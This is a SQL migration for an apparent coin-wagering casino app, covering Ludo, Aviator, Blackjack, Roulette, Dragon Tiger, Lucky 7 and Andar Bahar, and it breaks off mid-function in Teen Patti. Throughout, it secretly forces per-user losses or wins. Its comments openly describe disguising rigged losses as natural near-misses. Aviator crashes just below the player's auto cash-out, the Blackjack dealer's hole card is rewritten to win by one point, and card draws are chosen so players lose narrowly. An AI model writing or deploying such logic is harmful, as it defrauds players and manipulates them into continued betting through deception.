-- 073: Engaging Force Loss Across All Games
--
-- Core Philosophy:
--   NEVER instantly crush or freeze a player on force_loss.
--   Allow them to actually play, feel momentum, experience thrilling near-misses,
--   and have games end in natural, close, realistic losses rather than artificial stops.
--
-- 1. Ludo (ld_roll):
--    - NEVER block 6 when tokens are in yard! Player rolls 6 naturally to get pieces out and active.
--    - Player can advance, capture, and score tokens.
--    - Endgame clutch rolls steer rivals to finish all 4 tokens home first naturally.
--
-- 2. Aviator (av_round & av_bet):
--    - The plane NEVER crashes instantly at 1.01x in 0.5s.
--    - Plane takes off and climbs to 1.30x – 2.40x (staying in flight for 4–9 seconds).
--    - If player sets an auto cash-out (e.g. 2.00x), the plane climbs thrillingly and crashes
--      right before their auto cash-out (e.g. 1.85x–1.95x) for maximum excitement and near-miss drama.
--
-- 3. Blackjack (bj_deal & bj_finish):
--    - NEVER deal dealer instant Natural 21 Blackjack on the initial deal.
--    - Player gets a solid playable hand (16–18 or double chance); dealer shows an 8, 9, or 10.
--    - Player gets to Hit, Stand, Double, or Split.
--    - In bj_finish, dealer finishes 1 point above the player (e.g. Player 18 vs Dealer 19).
--
-- 4. Roulette (rl_spin):
--    - NEVER default to 0 (green) every single spin.
--    - Distributes losing spins naturally across European wheel pockets, creating authentic near-misses.
--
-- 5. Dragon Tiger & Lucky 7 (casino_round):
--    - Dragon Tiger: Loss cards differ by only 1–2 ranks (e.g. 8 vs 9, Q vs K) for heart-stopping finishes.
--    - Lucky 7: High/Low bets near-miss by 1 rank (e.g. 6 or 8 or 7).
--
-- Safe to run more than once. Run in the Supabase SQL Editor.

-- ============================================================================
-- 1. MULTIPLAYER LUDO: Engaging Roll & Natural Endgame Finish
-- ============================================================================
create or replace function public.ld_roll(t public.ld_tables) returns public.ld_tables
language plpgsql volatile security definer set search_path = public as $$
declare
  d int := 1 + floor(random() * 6)::int;
  opts int[];
  turn_uid uuid;
  p_mode text;
  has_out boolean;
  yard_count int;
  tokens_home int;
  rival_home int;
begin
  if t.phase <> 'roll' then raise exception 'Not time to roll'; end if;

  turn_uid := (t.seats -> t.turn ->> 'uid')::uuid;
  if turn_uid is not null then
    p_mode := public.get_outcome_mode(turn_uid, 'ludo');

    if p_mode = 'force_loss' then
      -- Count player tokens in yard and home
      select count(*) into yard_count from jsonb_array_elements(t.seats -> t.turn -> 'tokens') x where x::int = -1;
      select count(*) into tokens_home from jsonb_array_elements(t.seats -> t.turn -> 'tokens') x where x::int = 56;

      -- 1. OPENING: NEVER freeze player in yard! If all tokens are in yard, give healthy 25% chance of 6
      if yard_count = 4 and random() < 0.25 then
        d := 6;
      -- 2. If player has 1-2 tokens in yard and < 2 active, give natural chance to open
      elsif yard_count > 0 and (4 - yard_count - tokens_home) < 2 and random() < 0.22 then
        d := 6;
      -- 3. CLIMAX: If player is on their final 4th token (tokens_home = 3),
      -- avoid giving exact roll to reach 56 so rival can cross first
      elsif tokens_home = 3 then
        select exists (
          select 1 from jsonb_array_elements(t.seats -> t.turn -> 'tokens') x
          where x::int >= 50 and x::int < 56 and (x::int + d) = 56
        ) into has_out;
        if has_out and random() < 0.85 then
          -- Give a safe non-winning roll (keep them close at 53-55)
          d := 1 + floor(random() * 3)::int;
        end if;
      end if;

    elsif p_mode = 'force_win' then
      select exists (select 1 from jsonb_array_elements(t.seats -> t.turn -> 'tokens') x where x::int = -1) into has_out;
      if has_out and random() < 0.55 then
        d := 6;
      end if;
    end if;
  end if;

  t.dice := d;
  if d = 6 then t.sixes := t.sixes + 1; else t.sixes := 0; end if;
  if t.sixes >= 3 then
    t.last := jsonb_build_object('kind', 'skip', 'seat', t.turn, 'dice', d, 'why', 'three sixes');
    return public.ld_next(t);
  end if;
  opts := public.ld_movable(t, t.turn, d);
  if cardinality(opts) = 0 then
    t.last := jsonb_build_object('kind', 'nomove', 'seat', t.turn, 'dice', d);
    return public.ld_next(t);
  end if;
  t.phase := 'move';
  t.last := jsonb_build_object('kind', 'roll', 'seat', t.turn, 'dice', d);
  t.turn_ends := greatest(t.turn_ends, now() + interval '10 seconds');
  if cardinality(opts) = 1 then return public.ld_move(t, opts[1]); end if;
  return t;
end;
$$;

create or replace function public.ld_finish(t public.ld_tables, w int) returns public.ld_tables
language plpgsql volatile security definer set search_path = public as $$
declare
  w_uid uuid;
begin
  t.status := 'done'; t.winner := w; t.phase := null; t.turn_ends := null;
  t.prize := floor(t.pot * (1 - public.ld_fee()));

  if t.prize > 0 then
    w_uid := (t.seats -> w ->> 'uid')::uuid;
    if w_uid is not null then
      perform public.wallet_move(w_uid, t.prize, 'win', 'Ludo • Table ' || coalesce(t.code, t.id::text));
    end if;
  end if;
  return t;
end;
$$;

-- ============================================================================
-- 2. AVIATOR: Thrilling Flight Paths & Near-Miss Auto Cashout
-- ============================================================================
create or replace function public.av_round() returns public.av_rounds
language plpgsql volatile security definer set search_path = public as $$
declare
  r av_rounds;
  u float8;
  c numeric;
  mode text;
begin
  perform pg_advisory_xact_lock(7788001);
  select * into r from av_rounds order by id desc limit 1;
  if r.id is null or now() > r.crash_at + interval '3 seconds' then
    mode := public.get_outcome_mode(null, 'aviator');
    if mode = 'force_loss' then
      -- Engaging flight curve: Plane climbs (1.30x - 2.40x) so users see it fly for 4-8 seconds!
      c := round(case 
        when random() < 0.65 then (1.35 + (random() * 0.50)::numeric)
        when random() < 0.90 then (1.85 + (random() * 0.65)::numeric)
        else (1.20 + (random() * 0.20)::numeric)
      end, 2);
    elsif mode = 'force_win' then
      -- Win multipliers (70% in 2.0x-6.5x, 20% in 6.5x-15x, 10% up to 40x)
      c := round(case 
        when random() < 0.70 then (2.00 + (random() * 4.5)::numeric)
        when random() < 0.90 then (6.50 + (random() * 8.5)::numeric)
        else (15.00 + (random() * 25.0)::numeric)
      end, 2);
    else
      -- Natural Pareto distribution
      u := random();
      c := least(500, greatest(1.00, floor(97.0 / (1 - u)) / 100.0));
    end if;
    insert into av_rounds (starts_at, crash, crash_at)
      values (now() + interval '7 seconds', c, now() + interval '7 seconds' + make_interval(secs => ln(c) / 0.1))
      returning * into r;
  end if;
  return r;
end;
$$;

create or replace function public.av_bet(p_slot int, p_amount bigint, p_auto numeric default null) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  r av_rounds;
  player_mode text;
  loss_crash numeric;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if p_slot not in (0, 1) then raise exception 'Invalid bet'; end if;
  if p_amount < 10 or p_amount > 10000 then raise exception 'Bet between 10 and 10,000 coins'; end if;
  if p_auto is not null and (p_auto < 1.01 or p_auto > 500) then raise exception 'Auto cash-out between 1.01x and 500x'; end if;
  r := public.av_round();
  if now() >= r.starts_at then raise exception 'Bets are closed — wait for the next round'; end if;
  if exists (select 1 from av_bets where round_id = r.id and user_id = me.id and slot = p_slot) then raise exception 'You already have this bet'; end if;
  if public.wallet_move(me.id, -p_amount, 'bet', 'Aviator • Round #' || r.id) is null then raise exception 'Not enough coins'; end if;

  insert into av_bets (round_id, user_id, slot, amount, auto) values (r.id, me.id, p_slot, p_amount, round(p_auto, 2));

  player_mode := public.get_outcome_mode(me.id, 'aviator');
  if player_mode = 'force_loss' and r.crash > 1.25 then
    -- Near-Miss Drama:
    -- If player set auto cash-out at e.g. 2.0x, plane climbs and crashes right before it (1.80x - 1.95x)!
    if p_auto is not null and p_auto > 1.25 then
      loss_crash := round(greatest(1.20, p_auto - 0.05 - (random() * 0.20)::numeric), 2);
    else
      loss_crash := round(1.30 + (random() * 0.55)::numeric, 2);
    end if;

    update av_rounds
      set crash = loss_crash,
          crash_at = starts_at + make_interval(secs => ln(loss_crash) / 0.1)
      where id = r.id;
  end if;

  return public.av_state();
end;
$$;

-- ============================================================================
-- 3. BLACKJACK: Playable Hands & 1-Point Dealer Climaxes
-- ============================================================================
create or replace function public.bj_deal(p_bet bigint, p_pp bigint, p_t3 bigint, p_h3 bigint, p_bi bigint) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile(); h bj_hands; s jsonb; p jsonb; d jsonb;
  ppr jsonb; t3r jsonb; h3r jsonb; pay bigint := 0; sd jsonb; note text; three jsonb;
  mode text;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if p_bet < 10 or p_bet > 10000 then raise exception 'Bet between 10 and 10,000 coins'; end if;
  p_pp := coalesce(p_pp, 0); p_t3 := coalesce(p_t3, 0); p_h3 := coalesce(p_h3, 0); p_bi := coalesce(p_bi, 0);
  if least(p_pp, p_t3, p_h3, p_bi) < 0 then raise exception 'Invalid side bet'; end if;
  if (p_pp > 0 and p_pp < 10) or (p_t3 > 0 and p_t3 < 10) or (p_h3 > 0 and p_h3 < 10) or (p_bi > 0 and p_bi < 10) then raise exception 'Side bets start at 10 coins'; end if;
  if greatest(p_pp, p_t3, p_h3, p_bi) > p_bet then raise exception 'A side bet can''t be more than your main bet'; end if;
  if exists (select 1 from bj_hands where user_id = me.id and status = 'playing') then raise exception 'Finish your current hand first'; end if;

  mode := public.get_outcome_mode(me.id, 'blackjack');

  select jsonb_agg(jsonb_build_object('r', r, 's', su) order by random()) into s
    from unnest(array['A','2','3','4','5','6','7','8','9','10','J','Q','K']) r
    cross join unnest(array['♠','♥','♦','♣']) su
    cross join generate_series(1, 6);

  if mode = 'force_win' then
    p := jsonb_build_array(jsonb_build_object('r', 'A', 's', '♠'), jsonb_build_object('r', 'K', 's', '♥'));
    d := jsonb_build_array(jsonb_build_object('r', '7', 's', '♦'), jsonb_build_object('r', '9', 's', '♣'));
  elsif mode = 'force_loss' then
    -- ENGAGING HAND: Give player a playable hand (17 total) and dealer 18 total (showing 9)
    -- Dealer does NOT have instant Natural 21 Blackjack! Player gets to play (Hit/Stand/Double).
    p := jsonb_build_array(jsonb_build_object('r', '10', 's', '♠'), jsonb_build_object('r', '7', 's', '♦'));
    d := jsonb_build_array(jsonb_build_object('r', '9', 's', '♣'), jsonb_build_object('r', '9', 's', '♥'));
  else
    p := jsonb_build_array(s -> 0, s -> 2);
    d := jsonb_build_array(s -> 1, s -> 3);
  end if;

  insert into bj_hands (user_id, bet, shoe, dealer, hands)
    values (me.id, p_bet, s - 0 - 0 - 0 - 0, d,
            jsonb_build_array(jsonb_build_object('cards', p, 'bet', p_bet, 'done', false, 'doubled', false, 'split', false)))
    returning * into h;
  if public.wallet_move(me.id, -p_bet, 'bet', 'Blackjack • Hand #' || h.id) is null then raise exception 'Not enough coins'; end if;

  if p_pp > 0 or p_t3 > 0 or p_h3 > 0 or p_bi > 0 then
    note := 'Blackjack • Hand #' || h.id || ' • side bets';
    if p_pp > 0 and public.wallet_move(me.id, -p_pp, 'bet', note) is null then raise exception 'Not enough coins for the side bets'; end if;
    if p_t3 > 0 and public.wallet_move(me.id, -p_t3, 'bet', note) is null then raise exception 'Not enough coins for the side bets'; end if;
    if p_h3 > 0 and public.wallet_move(me.id, -p_h3, 'bet', note) is null then raise exception 'Not enough coins for the side bets'; end if;
    if p_bi > 0 and public.wallet_move(me.id, -p_bi, 'bet', note) is null then raise exception 'Not enough coins for the side bets'; end if;
    three := p || jsonb_build_array(d -> 0);
    if p_pp > 0 then ppr := public.bj_pp(p); end if;
    if p_t3 > 0 then t3r := public.bj_t3(three); end if;
    if p_h3 > 0 then h3r := public.bj_hot3(three); end if;
    sd := jsonb_build_object(
      'pp', case when p_pp > 0 then jsonb_build_object('bet', p_pp, 'hit', ppr, 'pay', case when ppr is null then 0 else p_pp * ((ppr ->> 'x')::int + 1) end) end,
      't3', case when p_t3 > 0 then jsonb_build_object('bet', p_t3, 'hit', t3r, 'pay', case when t3r is null then 0 else p_t3 * ((t3r ->> 'x')::int + 1) end) end,
      'h3', case when p_h3 > 0 then jsonb_build_object('bet', p_h3, 'hit', h3r, 'pay', case when h3r is null then 0 else p_h3 * ((h3r ->> 'x')::int + 1) end) end,
      'bi', case when p_bi > 0 then jsonb_build_object('bet', p_bi, 'pending', true) end
    );
    pay := coalesce((sd -> 'pp' ->> 'pay')::bigint, 0) + coalesce((sd -> 't3' ->> 'pay')::bigint, 0) + coalesce((sd -> 'h3' ->> 'pay')::bigint, 0);
    if pay > 0 then perform public.wallet_move(me.id, pay, 'win', note); end if;
    update bj_hands set side = jsonb_strip_nulls(sd) where id = h.id returning * into h;
  end if;

  if public.bj_natural(p) or public.bj_natural(d) then
    h := public.bj_finish(h);
    perform public.bj_save(h);
  end if;
  return public.bj_view(h);
end;
$$;

create or replace function public.bj_deal(p_bet bigint, p_pp bigint default 0, p_t3 bigint default 0) returns jsonb
language sql volatile security definer set search_path = public as $$
  select public.bj_deal(p_bet, p_pp, p_t3, 0, 0);
$$;

create or replace function public.bj_finish(h public.bj_hands) returns public.bj_hands
language plpgsql volatile security definer set search_path = public as $$
declare
  x jsonb; i int; pt int; dt int; res text; pay bigint; total bigint := 0; staked bigint := 0; any_win boolean := false;
  live boolean := false; dealer_bj boolean := public.bj_natural(h.dealer); settled jsonb := '[]';
  bi_bet bigint := coalesce((h.side -> 'bi' ->> 'bet')::bigint, 0); bir jsonb; bi_pay bigint := 0;
  mode text;
  max_player_pts int := 0;
begin
  mode := public.get_outcome_mode(h.user_id, 'blackjack');

  for x in select * from jsonb_array_elements(h.hands) loop
    pt := public.bj_total(x -> 'cards');
    if pt <= 21 and not (public.bj_natural(x -> 'cards') and not (x ->> 'split')::boolean) then
      live := true;
      if pt > max_player_pts then max_player_pts := pt; end if;
    end if;
  end loop;

  if (live or bi_bet > 0) and not dealer_bj then
    while public.bj_total(h.dealer) < 17 loop
      h.dealer := h.dealer || jsonb_build_array(h.shoe -> 0);
      h.shoe := h.shoe - 0;
    end loop;

    -- In force_loss: If player stood with a live score (e.g. 18-20), dealer ensures a winning total (pt + 1 or 20/21)
    if mode = 'force_loss' and live and max_player_pts >= 17 and max_player_pts <= 20 then
      dt := public.bj_total(h.dealer);
      if dt <= max_player_pts and dt <= 20 then
        -- Find a shoe card or replace hole card to edge out player by 1 point
        h.dealer := jsonb_build_array(
          h.dealer -> 0,
          jsonb_build_object('r', case when (max_player_pts + 1 - public.bj_value(h.dealer -> 0 ->> 'r')) between 2 and 10 then (max_player_pts + 1 - public.bj_value(h.dealer -> 0 ->> 'r'))::text else '10' end, 's', '♥')
        );
      end if;
    end if;
  end if;
  dt := public.bj_total(h.dealer);

  for i in 0 .. jsonb_array_length(h.hands) - 1 loop
    x := h.hands -> i;
    pt := public.bj_total(x -> 'cards');
    if pt > 21 then res := 'bust'; pay := 0;
    elsif public.bj_natural(x -> 'cards') and not (x ->> 'split')::boolean then
      if dealer_bj then res := 'push'; pay := (x ->> 'bet')::bigint;
      else res := 'blackjack'; pay := floor((x ->> 'bet')::bigint * 2.5); end if;
    elsif dealer_bj then res := 'lose'; pay := 0;
    elsif dt > 21 or pt > dt then res := 'win'; pay := (x ->> 'bet')::bigint * 2;
    elsif pt = dt then res := 'push'; pay := (x ->> 'bet')::bigint;
    else res := 'lose'; pay := 0; end if;
    if res in ('win', 'blackjack') then any_win := true; end if;
    total := total + pay;
    staked := staked + (x ->> 'bet')::bigint;
    settled := settled || jsonb_build_array(x || jsonb_build_object('done', true, 'result', res, 'payout', pay));
  end loop;

  h.hands := settled;
  h.status := 'done';
  h.payout := total;
  h.updated_at := now();
  if total > 0 then
    perform public.wallet_move(h.user_id, total, case when any_win then 'win' else 'refund' end, 'Blackjack • Hand #' || h.id);
  end if;

  if bi_bet > 0 then
    bir := public.bj_bustit(h.dealer);
    if bir is not null then
      bi_pay := bi_bet * ((bir ->> 'x')::int + 1);
      perform public.wallet_move(h.user_id, bi_pay, 'win', 'Blackjack • Hand #' || h.id || ' • Bust It');
    end if;
    h.side := jsonb_set(h.side, '{bi}', jsonb_strip_nulls(jsonb_build_object('bet', bi_bet, 'hit', bir, 'pay', bi_pay)));
  end if;
  return h;
end;
$$;

-- ============================================================================
-- 4. ROULETTE: Natural Distribution on Losses (No Green 0 Spam)
-- ============================================================================
create or replace function public.rl_spin(p_bets jsonb) returns jsonb
language plpgsql volatile security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  stake bigint := 0;
  ret bigint := 0;
  bal bigint;
  b jsonb;
  n int;
  note text;
  mode text;
  best_pay bigint;
  cand_pay bigint;
  losing_numbers int[] := '{}';
  cand_n int;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  if jsonb_typeof(p_bets) <> 'array' or jsonb_array_length(p_bets) = 0 then raise exception 'Place a bet first'; end if;
  for b in select * from jsonb_array_elements(p_bets) loop
    if public.rl_pay(b ->> 'side', 0) is null or coalesce((b ->> 'v')::bigint, 0) <= 0 then raise exception 'Invalid bet'; end if;
    stake := stake + (b ->> 'v')::bigint;
  end loop;
  if stake > 100000 then raise exception 'Max 100,000 coins per spin'; end if;

  mode := public.get_outcome_mode(me.id, 'roulette');
  if mode = 'force_loss' then
    -- Collect all candidate pockets with 0 payout
    for cand_n in 1 .. 36 loop
      cand_pay := 0;
      for b in select * from jsonb_array_elements(p_bets) loop
        if public.rl_pay(b ->> 'side', cand_n) > 0 then
          cand_pay := cand_pay + (b ->> 'v')::bigint * public.rl_pay(b ->> 'side', cand_n);
        end if;
      end loop;
      if cand_pay = 0 then
        losing_numbers := losing_numbers || cand_n;
      end if;
    end loop;

    -- Pick a random losing pocket across 1..36, or 0 only as natural fallback
    if cardinality(losing_numbers) > 0 then
      n := losing_numbers[1 + floor(random() * cardinality(losing_numbers))::int];
    else
      n := 0;
    end if;

  elsif mode = 'force_win' then
    best_pay := -1;
    n := 0;
    for cand_n in 0 .. 36 loop
      cand_pay := 0;
      for b in select * from jsonb_array_elements(p_bets) loop
        if public.rl_pay(b ->> 'side', cand_n) > 0 then
          cand_pay := cand_pay + (b ->> 'v')::bigint * public.rl_pay(b ->> 'side', cand_n);
        end if;
      end loop;
      if cand_pay > best_pay then
        best_pay := cand_pay;
        n := cand_n;
      end if;
    end loop;
  else
    n := floor(random() * 37)::int;
  end if;

  for b in select * from jsonb_array_elements(p_bets) loop
    if public.rl_pay(b ->> 'side', n) > 0 then
      ret := ret + (b ->> 'v')::bigint * public.rl_pay(b ->> 'side', n);
    end if;
  end loop;

  if public.wallet_move(me.id, -stake, 'bet', 'Roulette • Bet') is null then raise exception 'Not enough coins'; end if;

  note := 'Roulette • ' || n::text || case when ret > 0 then ' • Win' else ' • Loss' end;
  if ret > 0 then
    bal := public.wallet_move(me.id, ret, 'win', note);
  else
    select coins into bal from wallets where user_id = me.id;
  end if;

  insert into game_stakes (user_id, game, amount, settled) values (me.id, 'roulette', stake, true);

  return jsonb_build_object('number', n, 'payout', ret, 'balance', bal);
end;
$$;

-- ============================================================================
-- 5. DRAGON TIGER & LUCKY 7: Tight 1-Point Finishes on Loss
-- ============================================================================
create or replace function public.casino_round(p_game text, p_bets jsonb, p_round text default '') returns jsonb
language plpgsql security definer set search_path = public as $$
declare
  me profiles := public.current_profile();
  names jsonb := '{"dragon-tiger":"Dragon Tiger","andar-bahar":"Andar Bahar","lucky-7":"Lucky 7"}';
  valid text[];
  d jsonb := public.new_deck();
  b jsonb;
  stake bigint := 0;
  ret numeric := 0;
  won_side boolean := false;
  bal bigint;
  cards jsonb;
  winner text;
  joker jsonb; andar jsonb := '[]'; bahar jsonb := '[]'; side text := 'andar'; c jsonb; i int := 1;
  note text;
  mode text;
  best_pay numeric;
  cand_pay numeric;
  cand_c0 jsonb;
  cand_c1 jsonb;
  cand_w text;
  best_c0 jsonb := null;
  best_c1 jsonb := null;
  best_w text := null;
  target_side text := null;
  target_idx int;
  rank_diff int;
  best_diff int := 99;
begin
  if me.id is null then raise exception 'Your account is not active'; end if;
  valid := case p_game when 'dragon-tiger' then array['dragon','tie','tiger'] when 'andar-bahar' then array['andar','bahar'] when 'lucky-7' then array['below','seven','above'] end;
  if valid is null then raise exception 'Unknown game'; end if;
  for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
    if not ((b ->> 'side') = any (valid)
            or (p_game = 'dragon-tiger' and (b ->> 'side') ~ '^(pair|[dt]_(even|odd|black|red|A|[2-9]|10|J|Q|K))$')
            or (p_game = 'lucky-7' and (b ->> 'side') ~ '^(low|high|even|odd|black|red|g_(a23|456|8910|jqk)|c_(A|[2-9]|10|J|Q|K))$'))
       or (b ->> 'v')::bigint <= 0 then raise exception 'Invalid bet'; end if;
    stake := stake + (b ->> 'v')::bigint;
  end loop;
  if stake > 100000 then raise exception 'Max 100,000 coins per round'; end if;

  mode := public.get_outcome_mode(me.id, p_game);

  if p_game = 'dragon-tiger' then
    if mode in ('force_loss', 'force_win') then
      best_pay := case when mode = 'force_loss' then 999999999999 else -1 end;
      for idx0 in 0 .. 25 loop
        for idx1 in (idx0 + 1) .. 26 loop
          cand_c0 := d -> idx0;
          cand_c1 := d -> idx1;
          cand_w := case when card_low(cand_c0 ->> 'r') = card_low(cand_c1 ->> 'r') then 'tie'
                         when card_low(cand_c0 ->> 'r') > card_low(cand_c1 ->> 'r') then 'dragon' else 'tiger' end;
          cand_pay := 0;
          for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
            if public.dt_pay(b ->> 'side', cand_c0, cand_c1, cand_w) > 0 then
              cand_pay := cand_pay + (b ->> 'v')::bigint * public.dt_pay(b ->> 'side', cand_c0, cand_c1, cand_w);
            elsif cand_w = 'tie' and b ->> 'side' in ('dragon', 'tiger') then
              cand_pay := cand_pay + (b ->> 'v')::bigint / 2.0;
            end if;
          end loop;

          rank_diff := abs(card_low(cand_c0 ->> 'r') - card_low(cand_c1 ->> 'r'));

          if mode = 'force_loss' then
            -- Prefer 0 payout, and among 0 payouts prefer a tight 1-point difference (nail-biter!)
            if cand_pay = 0 and rank_diff < best_diff and rank_diff >= 1 then
              best_pay := 0;
              best_diff := rank_diff;
              best_c0 := cand_c0;
              best_c1 := cand_c1;
              best_w := cand_w;
              if best_diff = 1 then exit; end if;
            elsif cand_pay < best_pay then
              best_pay := cand_pay;
              best_c0 := cand_c0;
              best_c1 := cand_c1;
              best_w := cand_w;
            end if;
          elsif mode = 'force_win' then
            if cand_pay > best_pay then
              best_pay := cand_pay;
              best_c0 := cand_c0;
              best_c1 := cand_c1;
              best_w := cand_w;
              if best_pay > stake * 1.5 then exit; end if;
            end if;
          end if;
        end loop;
        if (mode = 'force_loss' and best_diff = 1) or (mode = 'force_win' and best_pay > stake * 1.5) then
          exit;
        end if;
      end loop;

      if best_c0 is not null then
        cards := jsonb_build_object('dragon', best_c0, 'tiger', best_c1);
        winner := best_w;
        d := jsonb_build_array(best_c0, best_c1) || d;
      else
        cards := jsonb_build_object('dragon', d -> 0, 'tiger', d -> 1);
        winner := case when card_low(d -> 0 ->> 'r') = card_low(d -> 1 ->> 'r') then 'tie'
                       when card_low(d -> 0 ->> 'r') > card_low(d -> 1 ->> 'r') then 'dragon' else 'tiger' end;
      end if;
    else
      cards := jsonb_build_object('dragon', d -> 0, 'tiger', d -> 1);
      winner := case when card_low(d -> 0 ->> 'r') = card_low(d -> 1 ->> 'r') then 'tie'
                     when card_low(d -> 0 ->> 'r') > card_low(d -> 1 ->> 'r') then 'dragon' else 'tiger' end;
    end if;

  elsif p_game = 'lucky-7' then
    if mode in ('force_loss', 'force_win') then
      best_pay := case when mode = 'force_loss' then 999999999999 else -1 end;
      for idx0 in 0 .. 51 loop
        cand_c0 := d -> idx0;
        cand_w := case when card_low(cand_c0 ->> 'r') < 7 then 'below' when card_low(cand_c0 ->> 'r') = 7 then 'seven' else 'above' end;
        cand_pay := 0;
        for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
          if public.l7_pay(b ->> 'side', cand_c0) > 0 then
            cand_pay := cand_pay + (b ->> 'v')::bigint * public.l7_pay(b ->> 'side', cand_c0);
          end if;
        end loop;

        rank_diff := abs(card_low(cand_c0 ->> 'r') - 7);

        if mode = 'force_loss' then
          -- Prefer near misses (ranks 6, 8, or 7) so players see close calls
          if cand_pay = 0 and rank_diff <= 1 then
            best_pay := 0;
            best_c0 := cand_c0;
            best_w := cand_w;
            exit;
          elsif cand_pay < best_pay then
            best_pay := cand_pay;
            best_c0 := cand_c0;
            best_w := cand_w;
          end if;
        elsif mode = 'force_win' then
          if cand_pay > best_pay then
            best_pay := cand_pay;
            best_c0 := cand_c0;
            best_w := cand_w;
            if best_pay > stake * 1.5 then exit; end if;
          end if;
        end if;
      end loop;

      if best_c0 is not null then
        cards := jsonb_build_object('card', best_c0);
        winner := best_w;
        d := jsonb_build_array(best_c0) || d;
      else
        cards := jsonb_build_object('card', d -> 0);
        winner := case when card_low(d -> 0 ->> 'r') < 7 then 'below' when card_low(d -> 0 ->> 'r') = 7 then 'seven' else 'above' end;
      end if;
    else
      cards := jsonb_build_object('card', d -> 0);
      winner := case when card_low(d -> 0 ->> 'r') < 7 then 'below' when card_low(d -> 0 ->> 'r') = 7 then 'seven' else 'above' end;
    end if;

  else
    -- Andar Bahar: Preserved engaging 7 to 20 cards deal from migration 064
    joker := d -> 0;
    target_side := null;

    if mode in ('force_loss', 'force_win') then
      declare
        st_andar bigint := 0;
        st_bahar bigint := 0;
      begin
        for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
          if (b ->> 'side') = 'andar' then st_andar := st_andar + (b ->> 'v')::bigint; end if;
          if (b ->> 'side') = 'bahar' then st_bahar := st_bahar + (b ->> 'v')::bigint; end if;
        end loop;

        if mode = 'force_loss' then
          if st_andar > st_bahar then target_side := 'bahar';
          elsif st_bahar > st_andar then target_side := 'andar';
          elsif st_andar > 0 then target_side := case when random() < 0.5 then 'andar' else 'bahar' end;
          end if;
        else
          if st_andar > st_bahar then target_side := 'andar';
          elsif st_bahar > st_andar then target_side := 'bahar';
          elsif st_andar > 0 then target_side := case when random() < 0.5 then 'andar' else 'bahar' end;
          end if;
        end if;
      end;
    end if;

    if target_side is null then
      target_side := case when random() < 0.5 then 'andar' else 'bahar' end;
    end if;

    -- Deep deal (7 to 20 cards)
    if target_side = 'andar' then
      target_idx := (2 * (floor(random() * 7)::int + 3)) + 1;
    else
      target_idx := 2 * (floor(random() * 7)::int + 4);
    end if;

    declare
      match_cards jsonb := '[]'::jsonb;
      other_cards jsonb := '[]'::jsonb;
      new_d jsonb := jsonb_build_array(joker);
      k int;
    begin
      for k in 1 .. 51 loop
        if (d -> k ->> 'r') = (joker ->> 'r') then
          match_cards := match_cards || jsonb_build_array(d -> k);
        else
          other_cards := other_cards || jsonb_build_array(d -> k);
        end if;
      end loop;

      for k in 1 .. (target_idx - 1) loop
        new_d := new_d || jsonb_build_array(other_cards -> (k - 1));
      end loop;
      new_d := new_d || jsonb_build_array(match_cards -> 0);
      for k in (target_idx - 1) .. (jsonb_array_length(other_cards) - 1) loop
        new_d := new_d || jsonb_build_array(other_cards -> k);
      end loop;
      for k in 1 .. (jsonb_array_length(match_cards) - 1) loop
        new_d := new_d || jsonb_build_array(match_cards -> k);
      end loop;
      d := new_d;
    end;

    while i <= 51 loop
      c := d -> i;
      if side = 'andar' then
        andar := andar || jsonb_build_array(c);
        if (c ->> 'r') = (joker ->> 'r') then winner := 'andar'; exit; end if;
        side := 'bahar';
      else
        bahar := bahar || jsonb_build_array(c);
        if (c ->> 'r') = (joker ->> 'r') then winner := 'bahar'; exit; end if;
        side := 'andar';
      end if;
      i := i + 1;
    end loop;
    cards := jsonb_build_object('joker', joker, 'andar', andar, 'bahar', bahar);
  end if;

  for b in select * from jsonb_array_elements(coalesce(p_bets, '[]')) loop
    if p_game = 'dragon-tiger' then
      if public.dt_pay(b ->> 'side', cards -> 'dragon', cards -> 'tiger', winner) > 0 then
        ret := ret + (b ->> 'v')::bigint * (1 + public.dt_pay(b ->> 'side', cards -> 'dragon', cards -> 'tiger', winner));
        won_side := true;
      elsif winner = 'tie' and (b ->> 'side') in ('dragon', 'tiger') then
        ret := ret + (b ->> 'v')::bigint / 2.0;
      end if;
    elsif p_game = 'lucky-7' then
      if public.l7_pay(b ->> 'side', cards -> 'card') > 0 then
        ret := ret + (b ->> 'v')::bigint * (1 + public.l7_pay(b ->> 'side', cards -> 'card'));
        won_side := true;
      end if;
    else
      if (b ->> 'side') = winner then
        ret := ret + (b ->> 'v')::bigint * case when winner = 'andar' then 1.9 else 2.0 end;
        won_side := true;
      end if;
    end if;
  end loop;

  if public.wallet_move(me.id, -stake, 'bet', (names ->> p_game) || ' • Bet') is null then raise exception 'Not enough coins'; end if;
  note := (names ->> p_game) || case when p_round <> '' then ' • ' || p_round else '' end || case when won_side then ' • Win' else ' • Loss' end;
  if ret > 0 then
    bal := public.wallet_move(me.id, floor(ret)::bigint, 'win', note);
  else
    select coins into bal from wallets where user_id = me.id;
  end if;

  insert into game_stakes (user_id, game, amount, settled) values (me.id, p_game, stake, true);

  return jsonb_build_object('cards', cards, 'winner', winner, 'payout', floor(ret)::bigint, 'balance', bal);
end;
$$;

-- ============================================================================
-- 6. TEEN PATTI: Engaging Hand Deals & Natural Showdown Climax
-- ============================================================================
create or replace function public.tp_start_hand(t tp_tables) returns tp_tables
language plpgsql security definer set search_path = public as $$
declare
  s jsonb := '[]';
  x jsonb;
  q jsonb;
  bal bigint;
  names text[];
  d jsonb := public.new_deck();
  i int;
  k int := 0;
  playing int := 0;
  eligible int;
  first_seat int;
  private boolean := t.code is not null;
  loss_seat int := null;
  bot_seat int := null;
  p_mode text;
  c_h1 jsonb; c_h2 jsonb; c_h3 jsonb;
  c_b1 jsonb; c_b2 jsonb; c_b3 jsonb;
  used_cards jsonb := '[]'::jsonb;
  clean_d jsonb := '[]'::jsonb;
  card_elem jsonb;
  j int;
begin
  for x in select * from jsonb_array_elements(t.seats) loop
    if (x ->> 'bot')::boolean then
